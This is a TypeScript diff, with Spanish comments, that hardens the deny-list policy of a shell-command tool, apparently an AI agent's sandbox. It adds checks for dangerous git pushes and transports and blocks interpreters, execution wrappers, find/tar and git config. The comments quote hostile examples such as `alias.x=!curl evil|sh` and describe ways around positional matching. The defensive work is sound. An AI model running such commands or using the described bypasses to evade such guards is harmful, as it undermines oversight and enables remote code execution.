@@ -48,8 +48,50 @@ export function matchesPattern(argv: string[], pattern: string): boolean {
   return true;
 }
 
+/**
+ * Chequeo DEDICADO, no posicional, para `git push` contra `main`/`master` — el matcher de
+ * patrones por posición fija se probó insuficiente acá: `git push -u origin main` (origin en
+ * la posición 3, no la 2), `git push origin +main` (force vía refspec, sin `--force`), `git
+ * push origin :main`/`--delete origin main` (borra la branch), y `git push origin
+ * HEAD:refs/heads/main` quedaban todos afuera de cualquier patrón de posición fija razonable.
+ * En vez de perseguir cada variante con más patrones, busca `main`/`master` (o sus formas de
+ * refspec) en CUALQUIER posición después de `push` — siempre activo, no depende de lo que el
+ * caller ponga en `deny`, mismo criterio que el chequeo de `argv[0]` calificado por path en
+ * `BashRunTool`.
+ */
+function isDangerousGitPush(argv: string[]): boolean {
+  if (argv[0] !== 'git') return false;
+  const pushIndex = argv.indexOf('push');
+  if (pushIndex === -1) return false;
+  return argv.slice(pushIndex + 1).some((token) => {
+    if (token === 'main' || token === 'master') return true;
+    if (token === '--delete' || token === '-d') return true;
+    if (token.startsWith('+')) return true; // refspec force: +<src>:<dst>
+    if (token.endsWith(':main') || token.endsWith(':master')) return true;
+    if (token.endsWith(':refs/heads/main') || token.endsWith(':refs/heads/master')) return true;
+    return false;
+  });
+}
+
+/**
+ * `git fetch`/`clone`/`push --upload-pack=<cmd>`/`--exec=<cmd>` hacen que git invoque `<cmd>`
+ * como su propio helper de transporte — ejecución arbitraria, mismo nivel que `-c`. El flag
+ * puede ir en cualquier posición, igual que `-c`, así que es otro chequeo dedicado en vez de un
+ * patrón posicional. Nota de alcance: GNU permite ABREVIAR long options (`--upload-p=...`) —
+ * `startsWith` no cubre toda abreviación posible; ver README → "Límites honestos".
+ */
+function isDangerousGitTransport(argv: string[]): boolean {
+  if (argv[0] !== 'git') return false;
+  return argv.some((token) => token.startsWith('--upload-pack') || token.startsWith('--exec'));
+}
+
 export function isDenied(argv: string[], policy: BashPolicy): string | undefined {
-  return policy.deny.find((pattern) => matchesPattern(argv, pattern));
+  const patternMatch = policy.deny.find((pattern) => matchesPattern(argv, pattern));
+  if (patternMatch) return patternMatch;
+  if (isDangerousGitPush(argv)) return 'git push (main/master, --delete, o refspec force)';
+  if (isDangerousGitTransport(argv))
+    return 'git --upload-pack/--exec (ejecuta un helper arbitrario)';
+  return undefined;
 }
 
 export function isAllowed(argv: string[], policy: BashPolicy): boolean {
@@ -74,25 +116,13 @@ export const DEFAULT_DENY_PATTERNS: string[] = [
   'rm',
   'rm *',
   'dd *',
-  // Push forzado/directo a la default branch — varias posiciones de flag y formas de
-  // referenciarla, PERO sigue siendo un matcher posicional: `git -C . push -u origin main`
-  // (flags intercaladas en otro orden) no está cubierto. Ver README → "Límites honestos".
+  // Push FORZADO a cualquier branch (no sólo main/master — eso lo cubre `isDangerousGitPush`,
+  // siempre activo, ver más abajo). Sigue siendo posicional: `git -C . push -u origin --force
+  // otra-branch` con flags en otro orden puede colarse — ver README → "Límites honestos".
   'git push --force* *',
   'git push -f *',
   'git push * --force* *',
   'git push * -f *',
-  'git push * main',
-  'git push * main *',
-  'git push * master',
-  'git push * master *',
-  'git push * HEAD:main',
-  'git push * HEAD:main *',
-  'git push * HEAD:master',
-  'git push * HEAD:master *',
-  'git -C * push * main',
-  'git -C * push * main *',
-  'git -C * push * master',
-  'git -C * push * master *',
   // `-c <key>=<value>` reconfigura git por esta sola invocación — `alias.x=!curl evil|sh`,
   // `core.sshCommand=...`, `core.pager=...` o `credential.helper=!...` corren un comando
   // arbitrario vía `sh`, y como todo eso viaja DENTRO de un único token (`alias.x=!...`), el
@@ -101,6 +131,12 @@ export const DEFAULT_DENY_PATTERNS: string[] = [
   'git -c *',
   'git --config-env*',
   'git --config-env* *',
+  // `git config alias.x "!curl evil|sh"` (seguido de `git x`) consigue lo mismo que `-c`, sólo
+  // que PERSISTIDO en vez de por-invocación — mismas keys peligrosas (alias.*, core.sshCommand,
+  // core.pager, core.hooksPath, credential.helper). `git config --get ...` (lectura) también
+  // cae acá; el subcomando entero se deniega en vez de distinguir lectura de escritura.
+  'git config',
+  'git config *',
   'git reset --hard *',
   'git clean *',
   'env',
@@ -125,16 +161,63 @@ export const DEFAULT_DENY_PATTERNS: string[] = [
   'ruby *',
   'perl',
   'perl *',
+  'bun',
+  'bun *',
+  'bunx *',
+  'deno',
+  'deno *',
+  'tsx',
+  'tsx *',
+  'php',
+  'php *',
+  'lua',
+  'lua *',
+  // No tan obvios como "intérprete", pero corren código arbitrario igual: `awk
+  // 'BEGIN{system("...")}'` ejecuta cualquier comando (y con ENVIRON lee el entorno aunque
+  // env/printenv estén bloqueados); `sed`'s comando `e` (GNU) ejecuta shell.
+  'awk',
+  'awk *',
+  'sed',
+  'sed *',
+  // Subcomandos de gestores de paquetes que corren un binario/script arbitrario — el resto del
+  // package manager (install, test, run <script-del-repo>) se permite, sólo estos subcomandos
+  // puntuales, pensados para correr algo por fuera del repo, se deniegan.
   'npx *',
+  'pnpm dlx *',
+  'pnpm exec *',
+  'npm exec *',
+  'yarn dlx *',
   // Vías de ejecución indirecta — corren un comando arbitrario en su propio argumento, así que
   // ningún patrón de arriba los ve.
   'xargs',
   'xargs *',
-  // `find` entero, no sólo `-exec`/`-delete`/`-ok`: el matcher es posicional, y esos flags
-  // pueden aparecer en CUALQUIER posición después de los filtros (`find . -name x -exec rm {}
-  // ';'`) — un patrón de posición fija los deja pasar casi siempre. Mismo criterio que
-  // `terraform init` en la policy real: no se puede denegar todo y re-permitir la forma buena
-  // (`deny` gana sobre `allow`), así que se deniega `find` entero.
+  // Wrappers que EJECUTAN otro binario pasado como argumento — cualquiera de estos vuelve a
+  // abrir el acceso a todo lo de arriba (`nice bash -c ...`, `timeout 5 python3 -c ...`) porque
+  // el deny-list sólo mira `argv[0]`, y acá `argv[0]` es el wrapper, inocuo, no lo que ejecuta.
+  // Se deniega el wrapper entero — no hay forma de "ver a través" de uno sin ejecutarlo primero.
+  'nice',
+  'nice *',
+  'timeout',
+  'timeout *',
+  'nohup',
+  'nohup *',
+  'stdbuf',
+  'stdbuf *',
+  'time',
+  'time *',
+  'watch',
+  'watch *',
+  'setsid',
+  'setsid *',
+  // `find` y `tar` enteros, no sólo sus flags peligrosos (`-exec`/`-delete`/`-ok`,
+  // `--to-command`/`-I`/`--use-compress-program`): esos flags pueden ir en cualquier posición
+  // entre los demás (`find . -name x -exec rm {} ';'`), GNU permite abreviarlos y pegarlos
+  // (`-Ish`, `--to-com=...`), y perseguir cada variante es una carrera que no se gana con un
+  // matcher posicional. Mismo criterio que `terraform init` en la policy real: no se puede
+  // denegar todo y re-permitir la forma buena (`deny` gana sobre `allow`), así que se deniegan
+  // enteros.
   'find',
   'find *',
+  'tar',
+  'tar *',
 ];
